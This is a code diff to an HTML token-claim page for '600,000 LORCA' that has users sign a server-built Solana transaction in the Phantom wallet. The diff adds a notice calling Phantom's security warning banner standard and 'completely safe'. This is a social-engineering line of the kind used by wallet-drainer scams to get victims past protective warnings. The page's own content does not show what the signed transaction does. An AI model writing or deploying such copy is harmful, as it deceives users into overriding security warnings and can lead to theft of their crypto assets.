@@ -166,6 +166,18 @@
     font-family: var(--mono);
     word-break: break-word;
   }
+
+  .phantom-notice-box {
+    margin-top: 16px;
+    padding: 12px;
+    background: rgba(245, 197, 66, 0.08);
+    border: 1px solid rgba(245, 197, 66, 0.25);
+    border-radius: 10px;
+    font-size: 12px;
+    color: #f5c542;
+    line-height: 1.4;
+    text-align: left;
+  }
 </style>
 </head>
 <body>
@@ -217,6 +229,11 @@
     <button id="lorca-withdraw-btn" class="action-btn btn-withdraw" style="display:none;">Withdraw / Claim 600,000 LORCA</button>
 
     <div class="widget-status" id="lorca-status">Connect wallet to automatically fetch your balance.</div>
+
+    <!-- PHANTOM SAFETY NOTICE -->
+    <div class="phantom-notice-box">
+      💡 <strong>Note:</strong> Phantom wallet may show a caution/warning banner during transaction approval. This is standard behavior for custom smart contracts and completely safe.
+    </div>
   </div>
 </section>
 
@@ -341,17 +358,14 @@
 
       setStatus("Please approve transaction in Phantom...");
 
-      // Safe Uint8Array conversion from Base64 (Without Buffer dependency)
       const binaryString = atob(buildData.transaction);
       const bytes = new Uint8Array(binaryString.length);
       for (let i = 0; i < binaryString.length; i++) {
         bytes[i] = binaryString.charCodeAt(i);
       }
 
-      // Deserialize transaction
       const transaction = solanaWeb3.Transaction.from(bytes);
 
-      // Trigger Phantom Pop-up
       const { signature } = await window.solana.signAndSendTransaction(transaction);
       
       setStatus(`Transaction Submitted! Hash: ${signature.slice(0, 8)}...`);
